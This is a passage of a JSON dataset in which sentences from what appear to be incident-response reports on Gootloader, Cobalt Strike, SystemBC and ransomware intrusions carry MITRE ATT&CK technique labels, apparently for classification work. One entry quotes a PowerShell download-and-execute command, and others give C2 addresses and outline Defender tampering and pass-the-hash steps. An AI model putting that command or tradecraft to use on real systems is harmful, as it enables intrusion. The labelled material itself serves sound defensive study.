  },
  {
    "type": "text",
    "text": "Gootloader upon execution creates two registry keys.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The PowerShell command will extract the .NET loader from HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0 and execute the code in memory via `Assembly.Load()`.",
    "command": "",
    "labels": [
      "T1047",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Once the PowerShell script is finished running, the next stage involves the .NET loader.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The .NET loader will read HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username and extract the encoded Cobalt Strike payload.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This payload will be decoded and subsequently loaded into memory for execution.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The encoded PowerShell command creates a Scheduled Task that executes when the selected user logs on to the computer.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "An encoded PowerShell command is executed that will retrieve and execute the payload stored in the Registry.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Windows Defender scheduled scans were deleted from the system.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "This was observed on multiple servers the threat actor pivoted to.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Furthermore, PowerShell was used to disable multiple security features built into Microsoft Defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "As in many cases involving Cobalt Strike, we observed rundll32 used to load the Cobalt Strike beacons into memory on the beachhead host.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This can be observed in the memory dump from the beachhead host with the tell-tale PAGE_EXECUTE_READWRITE protection settings on the memory space and MZ headers observable in the process memory space.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion we observed various named pipes utilized by the threat actor’s Cobalt Strike beacons including default Cobalt Strike named pipes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Decoding this script reveals that it is a publicly available WMIExec script for running remote WMI queries.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The output lists “Invoke-Mimikatz”, a direct reference to the PowerShell Invoke-Mimikatz.ps1 script used to load Mimikatz DLL directly in memory.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitoring PowerShell event id 4103 we can observe the threat actor’s successful credential access activity from the Mimikatz invocation.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The Cobalt Strike beacon was used to invoke the PowerShell script.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Next to deploying Cobalt Strike beacons, the threat actor also used RDP to establish interactive sessions with various hosts on the network.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "One important aspect of these sessions is that the threat actor authenticated using “Restricted Admin Mode”.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor attempted to use both Invoke-WMIExec and psexec to enable “Restricted Admin Mode”.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The logon information of EventID 4624 includes a field “Restricted Admin Mode”, which is set to the value “Yes” if the feature is used.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Shellbags reveled attempts to enumerate multiple file shares containing information of interest to the threat actor.",
    "command": "",
    "labels": [
      "T1033",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Gootloader second stage download URLs.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion the Gootloader loader was observed communicating to 35.206.117.64:443 kakiosk[.]adsparkdev[.]com.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Real Intelligence Threat Analytics (RITA) was successful in locating one of the IP addresses used for Cobalt Strike command and control communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Netscan data extracted via Volatility from the beachhead host showing Cobalt Strike C2 connections.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In February 2023, we detected an intrusion that was initiated by a user downloading and executing a file from a SEO-poisoned search result, leading to a Gootloader infection.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Around nine hours after the initial infection, the Gootloader malware facilitated the deployment of a Cobalt Strike beacon payload directly into the host’s registry, and then executed it in memory.",
    "command": "",
    "labels": [
      "T1055",
      "T1105",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor deployed SystemBC to tunnel RDP access into the network, which aided in compromising domain controllers, backup servers, and other key servers.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor conducted an interactive review of sensitive and confidential files using RDP; however, we have been unable to confirm whether any data was actually exfiltrated.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "On this webpage, a deceptive link enticed the user to download what was supposed to be an employment agreement.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Upon opening the received zip file, the user saw a JavaScript file bearing a name similar to their initial search term.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Clicking on this file triggered the Gootloader malware’s execution process.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "To ensure its continuous operation, Gootloader established a scheduled task to run this newly created file, incorporating a logon trigger for persistence.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "This script performs some basic discovery of information about the host using built-in PowerShell Cmdlets and WMI queries.",
    "command": "",
    "labels": [
      "T1047",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The script then reaches out to a rotating list of remote endpoints.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Around nine hours after the initial execution, one of the remote endpoints responded to the Gootloader malware, providing a download that was written to two registry keys.",
    "command": "",
    "labels": [
      "T1105",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Those registry keys contained an obfuscated launcher for Gootloader and a Cobalt Strike beacon, which was loaded directly into memory.",
    "command": "",
    "labels": [
      "T1055",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Next, an instance of process injection into dllhost was detected, accompanied by network connections to several remote hosts checking for LDAP and SMB.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This involved creating a remote service to disable Windows Defender’s Real-Time Monitoring.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Following this, additional process injections and access to the LSASS memory, were observed on the compromised hosts.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "However, on the domain controllers, Windows Defender remained operational and successfully thwarted the attempts to launch the beacons.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "They introduced a new PowerShell script onto a workstation and executed it, which was a PowerShell implementation of SystemBC.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This script initiated communication with a command and control server and established persistence by creating a registry run key.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Following this setup, the threat actor executed multiple commands through remote services on a domain controller to ensure RDP access was enabled.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "They then logged into the domain controller over RDP by routing the connection through the infected workstation using SystemBC.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Having gained access to the domain controller, the threat actor transferred a text file containing a series of commands through their RDP session, aimed at further attempts to disable Windows Defender.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1105",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "While that was running, they explored a remote file share, during which they accessed a document containing password-related information.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor next turned their attention to a backup server, utilizing Windows Remote Management (WinRM) to execute multiple commands, ensuring that RDP access to the server was enabled and open.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "After ensuring RDP was available, they connected to the server via RDP and proceeded to review the backup configurations for the environment.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "During this time, they also deployed the SystemBC PowerShell script on the server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Upon returning, the threat actor resumed accessing hosts over RDP.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor resumed their search for sensitive information by looking through file shares for documents pertaining to passwords, while operating from the backup server.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Throughout their RDP session, they interactively viewed data, yet no direct signs of data exfiltration were observed during this phase of activity.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Once opened the site masquerades as a forum and with a download link to an ‘Implied Employment Agreement’ document.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The ‘Implied Employment Agreement’ turned out to be a zip archive containing the GootLoader multistage loader.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "We can see from the below that the zip was downloaded from a website on the internet (ZoneId=3).",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The JavaScript file was executed after the user double-clicked on it within the opened zip archive.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Execution of the Javascript file drops another Javascript file named “Frontline Management.js”.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "In addition to the file, a new scheduled task named ‘InfrSiRfucture Technologies’ was created.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "This task was then invoked to run the new Javascript file.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The execution chain here is Svchost.exe(Scheduled Task) ➝ Wscript.exe ➝ Cscript.exe ➝ Powershell.exe",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The PowerShell script included URLs to ten remote servers:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Not all the included remote servers were weaponized at the time of execution, so some servers answered with HTTP 405 “Method Not Allowed”.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "For the server that was weaponized, however, there is a different response.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "For this intrusion, that was 46.28.105[.]94 with the URL “hxxp:blog[.]lilianpraskova[.]cz/xmlrpc[.]php”.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The server then started answering with the HTTP status code 200 “OK” and delivering the final stage in the Gootloader infection.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The final download contained three different components.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Gootloader stage1(prameter $cXqt) which was an obfuscated dll, Gootloader stage2(parameter $IbaY) which ended up as an exe file when deobfuscated.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Finally, a script wrote stage1 and stage2 into the registry before deobfuscating stage1 and loading that into memory.",
    "command": "",
    "labels": [
      "T1055",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Stage1 took care of the deobfuscation of stage2, the final payload for Gootloader, and loaded what we later will see is a Cobalt Strike Beacon.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "A scheduled task was created during the initial Gootloader execution.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "This task was run on demand to execute the next stage in the Gootloader malware chain, and setup a Logon Trigger to maintain persistence on the beachhead.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Later in the intrusion the threat actor deployed a SystemBC PowerShell script.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "They setup persistence for this script by using an autorun key named ‘socks_powershell’",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The use of the Cobalt Strike ‘getsystem’ command was evident, with cmd being spawned from the beacon (DLLHOST) to elevate to a ‘SYSTEM’ context.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Throughout the intrusion, new logon sessions were initiated using tokens created from harvested credentials.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Initially, a sacrificial process, dllhost.exe, was launched from the PowerShell payload using the credentials of the compromised beachhead account.",
    "command": "",
    "labels": [
      "T1055",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Using a harvested credential, a new logon session was created.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This was logged under Windows eventID 4624, showing the initial Logon ID, and followed the new Logon ID using the target user account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The newly created logon session (Logon ID) was assigned special privileges (elevated) as detailed in eventID 4672.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor targeted several accounts using the same technique, these were:",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor pivoted across compromised accounts and across several endpoints with relative ease.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The use of ‘Logon type 9’ alongside an authentication type of ‘seclogo’ strongly indicates credential use, akin to the ‘runas’ command’s /netonly method, as used by Cobalt Strike’s ‘pass the hash’ technique.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "On the beachhead host, to avoid dropping files to disk, several registry keys were created to store the payloads under: HCKU\\Software\\Microsoft\\Personalization",
    "command": "",
    "labels": [
      "T1053.005",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Each key has an associated payload (stage 1 and 2).",
    "command": "",
    "labels": [
      "T1055",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "These keys stored the data for the Cobalt Strike beacon executed on the beachhead.",
    "command": "",
    "labels": [
      "T1055",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Execution of the payload to run the Cobalt Strike beacon can be observed by base64 encoded PowerShell commands",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion we observed activity related to Windows Defender tampering.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Scheduled scanning tasks were deleted, and a service was created to disable real-time monitoring.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Restricted Admin Mode was enabled by modifying the DisableRestrictedAdmin key to 0",
    "command": "",
    "labels": [
      "T1078",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Enabling Restricted Admin Mode allows the attacker to use collected hashes to login instead of a password.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The second registry modification allowed RDP connections by changing the ‘DenyTSConnections’ setting.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "On the domain controller, ‘Netsh’ was used to enable the remote desktop firewall profile followed by the remote admin firewall profile",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "We observed process injection activity, with PowerShell and dllhost being utilized to load Cobalt Strike beacons into the memory on the beachhead host.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion, we observed multiple named pipes utilized by the threat actor’s Cobalt Strike injected beacons via PowerShell and dllhost:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Across the compromised endpoints where a Cobalt Strike beacon was deployed, the LSASS process was accessed to retrieve in memory credentials.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Suspicious CallTrace with ‘UNKNOWN’ indicates injected code, whilst the Granted Access 0x1010 is a standard behavior from credential stealing tools such as mimikatz.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The code 0x1010 can be broken down to the below access rights: 0x00000010 = VMRead, 0x00001000 = QueryLimitedInfo",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The operator spent some time accessing and viewing files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "In this intrusion ‘Notepad’ was used to view a file within a Passwords file share location.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Before hands on keyboard activity, Gootloader ran a number of PowerShell Cmdlets to collect basic host information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The first section collected environmental data from the host using env.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Next the host operating system using Get-WmiObject.",
    "command": "",
    "labels": [
      "T1047",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Followed by running processes with a filter for maintitlewindow using Get-Process.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "And a disk space check using Get-PsDrive.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Advanced IP Scanner (https://www.advanced-ip-scanner.com/) was executed from a compromised account and then used to look for systems with RDP (3389) open.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Scanning all the network endpoints for the presence of shared folders was undertaken.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "This is a common technique we’ve observed in other similar cases to discover and collect information of interest, i.e., credentials and confidential information.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The command was executed from a SYSTEM account, and a conhost process was created with no attached console session [https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-wtsgetactiveconsolesessionid#return-value]",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The Base64 value SQB is a common indicator of the IEX keyword, often used for downloading of files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:12210/'); Get-DomainFileServer",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The use of a loop back IP address [127.0.0.1] indicated that the script was delivered through its own implant [dllhost].",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike beacons were deployed across several endpoints using remote service creation.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1053.005",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Services were either created based on Powershell base64 encoded payloads or as a dropper executable.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Compiled Cobalt Strike beacons were dropped onto Domain Controllers",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike beacons distributed with SMB admin shares",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The diagram below shows the distribution of Cobalt Strike beacons to hosts in the environment over SMB admin shares.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor again executed a command to modify the registry key to enable Restricted Admin mode remotely via WMI.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "RDP was used to move laterally between several hosts.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The diagram below shows the RDP connections made by the threat actor.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor utilized RPC to create services remotely.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Using MSRPC Service Control Manager(SCM) is a known Cobalt Strike feature to execute code on remote hosts.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Here the CreateWowService call is used to run PowerShell command to disable Windows Defender Real Time Monitoring.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Using a compromised account, the threat actor was observed moving payloads between hosts using Notepad.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The file they dropped the content into was aptly named ‘payload.txt’.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The file payload.txt was captured on network share before the threat actor dropped the content into a text file with Notepad.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The data contained both an encoded PowerShell command and several commands to disable functionality in windows defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Besides password related documents mentioned in credential access other sensitive files were accessed using WordPad.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Some files of interest were legal-related files and folders such as Contracts.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The Cobalt Strike server used for this intrusion has been tracked in the DFIR Report threat intelligence feed before the incident occured.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The data can be saved and parsed using the 1768.py tool from Didier Stevens that reveals the Cobalt Strike stager configuration, including the C2 IP (91.215.85[.]143) and the license-ID (watermark) (206546002), which is a well-known watermark used in multiple attacks based on our previous published reports.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The beachhead host using a Cobalt Strike beacon, injected into PowerShell and DLLHost processes; these served as the main ingress and egress command and control channel to 91.215.85[.]143:443",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor used Cobalt Strike HTTP Beacons for command and control communication.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Three separate hosts were infected with a Cobalt Strike HTTP beacon communicating to IPv4 91.215.85[.]143:443.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion a PowerShell script named ‘s5.ps1’ was dropped to a users ‘AppData\\Roaming’ folder.",
    "command": "",
    "labels": [
      "T1105",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Approximately four minutes after the script was dropped, SOCKS (SystemBC) was utilized to tunnel network connections from the external IPv4 91.92.136[.]20:4001 to the domain controller via a compromised endpoint.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The SOCKS tunnel provided the following connectivity from the attacker computer and allowed RDP [3389] to be traversed externally.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "A side effect of utilizing a proxy (SOCKS tunnel) on the endpoint is unusual port allocations, for example, PowerShell talking to port 3389.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "In this case, RDP was used to tunnel to the Domain Controller via the PowerShell process, which used port 3389.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "ShareFinder supports -Ping, which ensures that a host is checked for connectivity via ICMP before connecting to it.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The screenshot below demonstrates the one to many relationship of ICMP echo requests from a single host, just as with the SMB traffic in the previous section.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "ICMP echo requests alone cannot be used as an indicator of file share discovery, this can also be a characteristic of network discovery software being used for legitimate or illegitimate purposes on the network.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "However, when paired with the characteristics above, this can further support the conclusion that a system on the network was performing discovery activities.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "In general, these detections may also overlap with legitimate software responsible for inventorying assets or performing scans on the network.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Snatch Team was able to go from brute forcing a Domain Administrator (DA) account via RDP, to running a Meterpreter reverse shell and a RDP proxy via Tor on a Domain Controller (DC), to encrypting all Domain joined systems in under 5 hours.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Snatch Team logged into a DA account from 193.70.12.240 around 0515 UTC.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "At 0753 UTC the threat actors made the next move running ipconfig and quser.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Just minutes later they began lateral movement initiating an RDP session with a DC.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Once on the DC the threat actor moved quickly deploying a tool set in C:\\Windows.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The .dat file turned out to be a configuration file with the executable being TOR creating an RDP tunnel.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "C2 initiated over HTTPS/443 to 91.229.77.161 via cplXen.exe",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "A separate executable was then dropped for stealthy persistence of cplXen.exe.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "X3.exe is a loader that uses the 3 DLLs (which are ini files) below to run cplXen.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Two Scheduled Tasks were created to launch the loader, which in turn persists the loading of cplXen.exe.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "They RDP’ed into the backup server, turned off Windows Defender, and executed safe.exe.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "All machines rebooted into safe mode before encrypting causing all logging and remote tools to fail.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Every server and online machine was rebooted into safe mode without networking which causes you to lose complete visibility.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "As we’ve seen time and time again, RDP is being brute forced to gain access into the network and then the threat actor moves laterally quickly to install ransomware.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Safe.exe is a Go based executable, it drops 4 bat files that kick off the ransom process.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "It creates a new service to run safe.exe and then sets the system to reboot into safe mode on next boot and then executes a shutdown of the system ASAP.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "When the system comes back up its in Safe Mode without networking.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "In March, we observed an intrusion which started with malicious spam that dropped IcedID (Bokbot) into the environment and subsequently allowed access to a group distributing Sodinokibi ransomware.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion the threat actors escalated privileges to Domain Administrator, exfiltrated data, and used Sodinokibi to ransom all domain joined systems.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "In our intrusion, the threat actors leveraged malicious spam using an xlsm document which, upon opening and enabling the macro, initiated a wmic command to execute the IcedID trojan from a remote executable posing as a GIF image.",
    "command": "",
    "labels": [
      "T1047",
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Persistence was setup using a scheduled task and discovery commands were initiated from the malware within minutes of execution.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "About an hour and a half after initial access, the malware pulled down Cobalt Strike Beacons from 2 different command and control servers, which were both used through-out the intrusion.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Once the Cobalt Strike Beacons were established, lateral movement began, first to an Exchange server, then pivoting to other servers.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
